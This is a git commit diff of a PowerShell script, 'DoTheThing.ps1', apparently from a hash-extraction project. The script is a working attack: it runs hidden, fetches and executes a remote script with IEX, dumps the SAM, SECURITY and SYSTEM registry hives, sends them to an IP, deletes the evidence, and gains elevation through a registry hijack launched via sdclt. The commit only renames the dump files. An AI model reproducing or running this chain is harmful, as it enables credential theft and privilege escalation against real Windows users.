9d0ecb70960177fd8b6ec3067147abc1769571c4
mo-tec <moritzpfefferkorn@hotmail.com>
2020-11-11 19:11:25 +0100

    Update DoTheThing.ps1

--- DoTheThing.ps1
+++ DoTheThing.ps1
@@ -1,6 +1,6 @@
 ﻿
 $ip = 'localhost'
-$Value = "powershell -windowstyle hidden `$b=((wget 'https://raw.githubusercontent.com/mo-tec/HashExtractor/master/Invoke-Transmission.ps1' -UseBasicParsing).Content);IEX `$b;reg save HKLM\sam C:\Users\Public\sam;reg save HKLM\security C:\Users\Public\security;reg save HKLM\system C:\Users\Public\system;Invoke-Transmission -ip $ip;Remove-Item 'C:\Users\Public\A.bat';Remove-Item 'C:\Users\Public\sam';Remove-Item 'C:\Users\Public\security';Remove-Item 'C:\Users\Public\system';[System.Environment]::SetEnvironmentVariable('A', '',[System.EnvironmentVariableTarget]::User)"
+$Value = "powershell -windowstyle hidden `$b=((wget 'https://raw.githubusercontent.com/mo-tec/HashExtractor/master/Invoke-Transmission.ps1' -UseBasicParsing).Content);IEX `$b;reg save HKLM\sam C:\Users\Public\1;reg save HKLM\security C:\Users\Public\2;reg save HKLM\system C:\Users\Public\3;Invoke-Transmission -ip $ip;Remove-Item 'C:\Users\Public\A.bat';Remove-Item 'C:\Users\Public\1';Remove-Item 'C:\Users\Public\2';Remove-Item 'C:\Users\Public\3';[System.Environment]::SetEnvironmentVariable('A', '',[System.EnvironmentVariableTarget]::User)"
 [System.Environment]::SetEnvironmentVariable('A', $Value,[System.EnvironmentVariableTarget]::User)
 New-Item -Path 'C:\Users\Public\A.bat' -Value '%A%'
 New-Item "HKCU:\Software\Classes\Folder\shell\open\command" -Force -Value "C:\Users\Public\A.bat"
@@ -10,3 +10,4 @@ start cmd "/c start sdclt"
 sleep 3
 Remove-Item "HKCU:\Software\Classes\Folder\shell\open\command"
 exit
+
